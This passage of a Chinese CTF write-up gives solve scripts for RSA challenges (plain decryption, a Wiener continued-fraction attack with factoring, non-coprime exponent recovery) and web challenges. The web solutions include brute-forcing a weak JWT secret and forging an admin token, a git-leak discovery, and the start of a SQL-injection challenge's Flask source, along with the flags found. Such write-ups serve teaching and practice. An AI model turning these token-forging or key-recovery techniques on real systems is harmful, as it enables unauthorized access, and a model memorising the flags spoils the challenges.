class="number">131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 n 和 φ(n)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d = e^(-1) mod φ(n)</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密过程：m = c^d mod n</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文从数字转换为字符串（假设明文是ASCII编码）</span></span><br><span class="line">m_hex = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]  <span class="comment"># 将明文转换为十六进制字符串</span></span><br><span class="line">m_bytes = <span class="built_in">bytes</span>.fromhex(m_hex)  <span class="comment"># 将十六进制字符串转换为字节</span></span><br><span class="line">m_text = m_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 将字节解码为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文 m:&quot;</span>, m_text)</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;9f873f1c0315202caf47572a0bc24715&#125;</span><br></pre></td></tr></table></figure><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>先看提示：e很大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = gmpy2.invert(d, (p**<span class="number">2</span> - <span class="number">1</span>) * (q**<span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;QLNU&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(p + q).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">p_q=p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=\n&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p_q=&quot;</span>,p_q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e= 11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span></span><br><span class="line"><span class="comment">#p_q= 130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span></span><br></pre></td></tr></table></figure><p>找脚本来解决这个问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算连分数</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表最后的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="comment"># 这里的渐进分数分子分母要分开</span></span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span></span><br><span class="line"><span class="string">    :param a:x^2的系数</span></span><br><span class="line"><span class="string">    :param b:x的系数</span></span><br><span class="line"><span class="string">    :param c:pq</span></span><br><span class="line"><span class="string">    :return:p，q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算列表所有的渐近分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表所有的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: 私钥d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=<span class="number">11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span></span><br><span class="line">n=<span class="number">130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span></span><br><span class="line">d=wienerAttack(e, n**<span class="number">2</span>)</span><br><span class="line">k = e * d - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r = k</span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = r // <span class="number">2</span></span><br><span class="line">    t += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> r % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, r, n)</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">1</span> <span class="keyword">or</span> y == n - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        x = <span class="built_in">pow</span>(y, <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> success:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> success:</span><br><span class="line">    p = libnum.gcd(y - <span class="number">1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;P: &#x27;</span> + <span class="string">&#x27;%s&#x27;</span> % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Q: &#x27;</span> + <span class="string">&#x27;%s&#x27;</span> % q)</span><br><span class="line">    hash_result = hashlib.md5(<span class="built_in">str</span>(p + q).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;QLNU&#123;&#x27;</span> + hash_result.encode() + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Cannot compute P and Q&#x27;</span>)</span><br><span class="line">QLNU&#123;88a27758257b7c87174b6ea972a1b854&#125;</span><br></pre></td></tr></table></figure><h2 id="not-prime"><a href="#not-prime" class="headerlink" title="not_prime"></a>not_prime</h2><p>根据提示，e和phi不互素</p><p>原题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e= <span class="number">485</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p= 90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span></span><br><span class="line"><span class="comment">#q= 105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span></span><br><span class="line"><span class="comment">#c= 4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span></span><br></pre></td></tr></table></figure><p>利用脚本解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span></span><br><span class="line">q= <span class="number">105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span></span><br><span class="line">e= <span class="number">485</span></span><br><span class="line">c= <span class="number">4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        (<span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDNkY2UxYTViM2U0ZjBmM2U2NWNkOGJhMDM0M2Y0YmFfazFhbFZXSVRTQTQ0UE4zdHB0UnA2c1RWWXNGVkFUWmlfVG9rZW46SEZXMmJtVG1IbzhQWGF4Q3R5bWNiSkR6bnpiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;1f4154c0-9d88-4882-b41f-75ce14664c91&#125;</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Myjwt"><a href="#Myjwt" class="headerlink" title="Myjwt"></a>Myjwt</h2><p>看提示</p><p>jwt是个啥</p><p>弱密钥</p><p>题目名字myjwt也是一个工具</p><p>这里使用<a href="https://jwt.io/">https://jwt.io/</a></p><p>利用myjwt工具，获得密码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWE5YzBhMzhkNjIwNjE3Y2UwZjQyYjM1YWY4YmQ3YzJfSXZla2Q1R0NJSVc5U0o4eTZ0V2RaQjk2dTdjc0FyVUJfVG9rZW46QTZTdmJvRHJvb0dJVk14ekVJaWNNZnFvbjFnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>使用myjwt得到新的jwt，利用字典暴破得到密码为12345678</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDI3MzU3NzNmM2IyMWNjMGNlM2EzMTQzNWMwNWUzYmZfY090Q083aUZjM05QaXVKYnExa25uVHlRR0NtYmZNcUpfVG9rZW46QTZ5RWJyZXlZb3ZoVEx4b0RKYWNuOU1lbkVjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJleHAiOjE3NDI3MzA0MTF9.D6_ADIpgPto9XWtPKPqN17CX3x1NZ3_1VoEIDhmsbXY</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MmJiMzdlYzU3ZDdjZjIwZWNlMDY5ZTQ4MGI2NGQxN2FfdGxiS0RQbjZ1VXN4WmNYY0g4OWJ5UGFUa1ZKT2tuanlfVG9rZW46SUoxZGJ6Zm1ib3kxell4NHo5cWNFRWVBbmJjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>将guest改为admin</p><p>密码为12345678</p><p>得到新的jwt：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI3MzA0MTF9.TNnlCu96PT8VmwGmzhmvcEiGDODVX7g_mu8B824rEKE</span><br></pre></td></tr></table></figure><p>再使用insomnia</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTkzZTAzOTdhMmVlOWExNmM0M2Q1ZDUxZTNjOWQxNzRfWnM1YnJlUDJveFRNTEVYbGtNWDExU3hUbjlSdEVJZ2NfVG9rZW46UUhDaGJZWFV2b1Q3T0V4dm0yR2M5N011bjJkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8146d9bd-18d1-4512-bb44-c1a2dcf7d2f2&#125;</span><br></pre></td></tr></table></figure><h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><p>根据已知条件，题目网址为<a href="https://balabala.sky233.top/">https://balabala.sky233.top/</a></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDU4ZGQxOWZmYWEwNTcwOGU5ZTYyZWJjNDBmOGI1YzVfTVl3b0pJRjE5TERxY0JYblJKSjlGQjZndXZzTXJMdHNfVG9rZW46VGZEZWJNRDlsb2pUMGN4SFBoYWNzQWFRbmhmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>输入<a href="https://balabala.sky233.top/robots.txt">https://balabala.sky233.top/robots.txt</a></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDEwNTY3Y2JlNzM1Y2E1Zjg0ZjZkNTQyYmE4N2Y1Y2FfU1RWOVduNTFJc3dqWDNlMUJFa3B0N3dSSU9icjRDandfVG9rZW46RkNSMWJMY3AxbzNtbWV4bUM4MmM4WHlWblVnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>可以知道这道题目为git泄露 我是从虚拟机中解决的这道题</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmI5Mzc0NTNkYWQwZTVjOTRkZGZkMTVlYmFjNDM1MjJfTURiazJiTk1ZUzJQbFVrSEV5N2JXRDdTd2w3SW5uNTVfVG9rZW46UUdJVWJLSnBNbzlybzF4OEFUZ2Mxd3BZbmdYXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;S1mpl3_g1t_AnD_sWp&#125;</span><br></pre></td></tr></table></figure><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>先看一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cache</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> psycopg2</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = Path(<span class="string">&quot;/app/f1aaaaaaggggggg&quot;</span>).read_text().strip()</span><br><span class="line"></span><br><span class="line">white_list = <span class="built_in">set</span>(<span class="string">&quot; &#x27;flag&#123;HeL10_W0rld&#125;&#x27;&quot;</span> + string.digits + string.ascii_letters+<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">black_list = [<span class="string">&quot;like&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@cache</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_database</span>():</span><br><span class="line">    db_user = <span class="string">&quot;postgres&quot;</span></span><br><span class="line">    db_password = <span class="string">&quot;postgresql&quot;</span></span><br><span class="line">    db_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> connection</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    conn = connect_database()</span><br><span class="line">    create_sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        DROP TABLE IF EXISTS company;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS company (</span></span><br><span class="line"><span class="string">            name TEXT</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> sql:</span><br><span 